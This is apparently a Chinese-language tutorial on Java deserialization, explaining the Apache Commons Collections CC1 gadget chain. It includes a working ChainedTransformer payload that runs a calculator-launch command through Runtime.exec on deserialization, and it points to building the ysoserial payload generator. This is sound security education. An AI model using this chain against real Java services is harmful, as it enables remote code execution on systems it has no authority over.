## 概念
> 序列化: 对象 => 字节序列
> 
> 反序列化: 字节序列 => 对象

## Java序列化
> Java规定:实现Serializable和Externalizable接口的类的对象才能被序列化。
> 
> fastjson是另外一套实现的序列化机制,有别于Java原生的序列化模式

#### 例子
添加person类,实现Serializable接口
```
package it.fastjson.test;
import java.io.Serializable;
public class person implements Serializable {
    private static final long serialVersionUID = -5809782578272943999L;

    private String name;
    private int age;
    private String sex;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getSex() {
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }
}
```
序列化和反序列化:
```
    /*
    序列化 writeObject
    */
    person p = new person();
    p.setAge(11);
    p.setName("hello");
    p.setSex("男");

    File file = new File("person.ser");
    OutputStream os = new FileOutputStream(file);
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(os);
    objectOutputStream.writeObject(p);

    /*
    反序列化 readObject
    */
    FileInputStream fs = new FileInputStream("person.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(fs);
    Object o = objectInputStream.readObject();
    System.out.println(o); //这里o就是person对象的实例, person{name='hello', age=11, sex='男'}
```
## 什么是Apache Commons Collections?
```
Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库。
它包含有很多jar工具包,提供了很多强有力的数据结构类型并且实现了各种集合工具类。

说到底:就是对list/queue/set等进一步的抽象封装,提供更强大的功能的第三方库
```

## 怎么执行命令?
### TransformedMap
TransformedMap:该类可以在一个元素被添加/删除/或是被修改时(即key或value：集合中的数据存储形式即是一个索引对应一个值，就像身份证与人的关系那样)，会调用transform方法自动进行特定的修饰变换

**换句话说，TransformedMap类中的数据发生改变时，可以自动对进行一些特殊的变换，比如在数据被修改时，把它改回来; 或者在数据改变时，进行一些我们提前设定好的操作[执行代码]。**

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
//通过TransformedMap.decorate可以获得TransformedMap对象
    
第一个参数为待转化的Map对象
第二个参数为Map对象内的key要经过的转化方法[Transformer类格式的函数]（可为单个方法，也可为链，也可为空）
第三个参数为Map对象内的value要经过的转化方法[Transformer类格式的函数]
```

### Transformer
**知识点**

```ConstantTransformer 把一个对象转化为常量，并返回。```

```InvokerTransformer 通过反射，返回一个对象```

```ChainedTransformer:ChainedTransformer为链式的Transformer，会挨个执行我们定义Transformer```
###### InvokerTransformer类中的InvokerTransformer代码
```
public class InvokerTransformer implements Transformer, Serializable {
    /*
        Input参数为要进行反射的对象，
        iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型
        iArgs为对应方法的参数
        在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数
    */
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass(); //重点代码
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);

        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

}
```
###### transformers方法生成
```
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
            new Class[] {String.class, Class[].class }, new Object[] {
            "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke",
            new Class[] {Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
    new InvokerTransformer("exec",
            new Class[] {String.class }, new Object[] {"open /Applications/Calculator.app"})};

//首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap
Transformer transformedChain = new ChainedTransformer(transformers);
//以上代码实现的就是 Runtime.getRuntime,exec("open /Applications/Calculator.app")
```

**反射调用getRuntime函数，再调用getRuntime的exec()函数，执行命令。依次调用关系为： Runtime --> getRuntime --> exec();因此，我们要提前构造 ChainedTransformer链，它会按照我们设定的顺序依次调用Runtime, getRuntime,exec函数，进而执行命令。正式开始时，我们先构造一个TransformeMap实例，然后想办法修改它其中的数据，使其自动调用tansform()方法进行特定的变换(即我们之前设定好的)**


### **生成TransformedMap,参数是map和ChainedTransformer,对TransformedMap进行修改操作就能自动触发ChainedTransformer函数中的命令执行**

### 执行如下代码会弹出计算器
![](/java/commons-collection/cc1.jpg)


## 如何在反序列化(readObject())的时候触发修改TransformedMap?
### **回顾上一步的代码:需要在readObject时造成代码的执行,需要满足如下2个条件,1 是重写readObject方法,2.方法对map的键值操作进行修改**

### sun.reflect.annotation.AnnotationInvocationHandler类
![](/java/commons-collection/cc1_AnnotationInvocationHandler.jpg)


## 思路总结
#### 调用链
![](/java/commons-collection/cc1总结.jpg)

> 只需要构造AnnotationInvocationHandler的实例并且序列化 -> c1

> readObject 反序列化 c1 就能触发代码执行


## ysoserial
```ysoserial是一个生成序列化payload数据的工具。```

```
git　clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -DskipTests
```

